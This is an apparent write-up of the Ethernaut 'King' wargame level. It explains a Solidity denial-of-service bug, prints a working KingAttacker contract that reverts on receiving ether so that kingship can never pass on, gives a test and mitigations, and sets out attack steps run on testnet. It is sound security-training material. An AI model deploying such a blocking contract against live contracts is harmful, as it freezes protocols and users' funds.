# Level 9: King

**Level Page**: [See on Ethernaut](https://ethernaut.openzeppelin.com/level/0x3049C00639E6dfC269ED1451764a046f7aE500c6)

**Description**:

The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! As ponzi as it gets xD

Such a fun game. Your goal is to break it.

When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.

`Text after completing the level`:

Most of Ethernaut's levels try to expose (in an oversimplified form of course) something that actually happened — a real hack or a real bug.

In this case, see: [King of the Ether](https://www.kingoftheether.com/thrones/kingoftheether/index.html) and [King of the Ether Postmortem](https://www.kingoftheether.com/postmortem.html).

**Code**

Code to be exploited:

<details>
<summary>See Code</summary>

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
  address king;
  uint256 public prize;
  address public owner;

  constructor() payable {
      owner = msg.sender;
      king = msg.sender;
      prize = msg.value;
  }

  receive() external payable {
      require(msg.value >= prize || msg.sender == owner);
      payable(king).transfer(msg.value);
      king = msg.sender;
      prize = msg.value;
  }

  function _king() public view returns (address) {
      return king;
  }
}
```

</details>

# Findings

## [H-1] Denial of Service (DoS) attack can block anyone else to send value to contract and be the king, breaking the whole protocol

**Description**: Every time someone sends ether to `King` contract and this value is greater than the `King::prize`, the contract transfers to the last king address and update the king as the address who sent the value. The thing is that this address can actually be a malicious contract that does not allow to receive ethers or just revert when receiving ether. 

Consider the `King::receive` function:

```javascript
    receive() external payable {
      require(msg.value >= prize || msg.sender == owner);
@>    payable(king).transfer(msg.value);
      king = msg.sender;
      prize = msg.value;
    }
```

if in this case, the `king` address is this contract below, the protocol would never work again:

<details>
<summary>See Code</summary>

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {King} from "./King.sol";

contract KingAttacker {
  King king;

  constructor(address _king) {
    king = King(payable(_king));
  }

  function attack() external payable{
    (bool success, ) = address(king).call{value: msg.value}("");
    if(!success) revert();
  }

  // This will block anyone to finish the execution of 'King::receive' function
  // because the 'payable(king).transfer(msg.value);' transference will always revert.
  receive() external payable{
    revert();
  }
}
```

</details>

**Impact**: The protocol would never work again due to a DoS.

**Proof of Code**: In this test below we execute the `KingAttacker::attack` in order to claim to be king, and then try to reclaim the king with contract owner, but as the `KingAttacker` reverts on any value receiving, no one else can ever be king again:

```javascript
function testShouldBlockNextInvestmentst() public{
  vm.prank(attacker);
  kingAttacker.attack{value: 2 wei}();

  vm.expectRevert();
  vm.prank(owner);
  (bool success, ) = address(king).call{value: 3 wei}("");

  assertTrue(success);
}
```

**Recommended mitigation**: A recommended mitigation for this protocol is to not allow a king to be a contract. To do that, we can to use the assembly opcode `EXTCODESIZE`. This opcode will try to get the code size of this address, if the address is a contract the size will be greater than zero, otherwise if is not a contract.

So we could create another function to verify if some address is a function and call it inside `King::receive`:

```diff
  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
+   require(!isContract(msg.sender), "Should not be a contract");
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

+ function isContract(address _addr) private returns (bool is_contract){
+   assembly {
+     is_contract := extcodesize(_addr)
+   }
+ }
```

Remember that the first king is set in the `King::constructor`, so in this case you should consider that on the contract deploy.

But, depending on the context you would also want to allow contracts to iteract with `King` right? So a good solution is to create a balances mapping to register all the promised king prizes to be sent and create a `withdraw` function to allow the addresses to withdraw their prizes once the stop being king. Read more [about this solution](https://solidity-by-example.org/hacks/denial-of-service/).

```diff
  // SPDX-License-Identifier: MIT
  pragma solidity ^0.8.0;

  contract King {
    address king;
    uint256 public prize;
    address public owner;
+   mapping(address => uint256) public balances;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
-       payable(king).transfer(msg.value);
+       balances[king] += msg.value;
        king = msg.sender;
        prize = msg.value;
    }

+   function withdraw() public {
+       require(msg.sender != king, "Current king cannot withdraw");
+
+       uint256 amount = balances[msg.sender];
+       balances[msg.sender] = 0;
+
+       (bool sent,) = msg.sender.call{value: amount}("");
+       require(sent, "Failed to send Ether");
+   }

    function _king() public view returns (address) {
        return king;
    }
  }
```

# Attack

**Description**: To exploit this vulnerability we can follow the steps below:

1. Deploy our `KingAttacker` passing the `King` contract address to it.
2. Paste the `KingAttacker` address as the `ATTACKER_CONTRACT` value in `.env` file.
3. Get the current `King::prize` using `make prize`. This command will execute a call in the `King::prize` public variable (`cast call $$VICTIM_CONTRACT_INSTANCE "prize()(uint256)" --rpc-url sepolia`).
4. Copy the prize value, paste as the `ATTACK_VALUE` value in `.env` file and increase the prize with `1 wei` (e.g. if the prize was `1000000000000000` you are going to use `1000000000000001` to be king)
5. Attack the `King` contract by running `make attack`.
6. Submit the level by running `make submit`.

**Instance used**: [0x9296C00F868AA9478C26b1Af895DCE0d961DE804](https://sepolia.etherscan.io/address/0x9296C00F868AA9478C26b1Af895DCE0d961DE804)

**Attacker Contract**: [0x7aeB4ABe4B095F8f00765F2Eaaf5e51bCdd04d76](https://sepolia.etherscan.io/address/0x7aeB4ABe4B095F8f00765F2Eaaf5e51bCdd04d76)

**Attack Transaction**: [see on etherscan](https://sepolia.etherscan.io/tx/0x8e1289bfc77de7ad1f21cb1f6c1ca92acd57a0f7458f1d9bfb4b34f2ead17e7e)

**Level Completed Transaction**: [see on etherscan](https://sepolia.etherscan.io/tx/0xa6f239859b97400b3d676a357c720972fb1c9503fa0b345b765f0ac83228df8d)

# Getting started

## Build

```bash
make build
```

## Test

```bash
make test
```
## Get prize value from King contract (testnet)

```bash
make prize
```

## Deploy Attacker Contract (testnet)

```bash
make deploy
```

## Attack (testnet)

```bash
make attack
```

## Submit level (testnet)

```bash
make submit
```

## Check if you completed the level (testnet)

`true` - You completed the level
`false` - You didn't complete the level

```bash
make check
```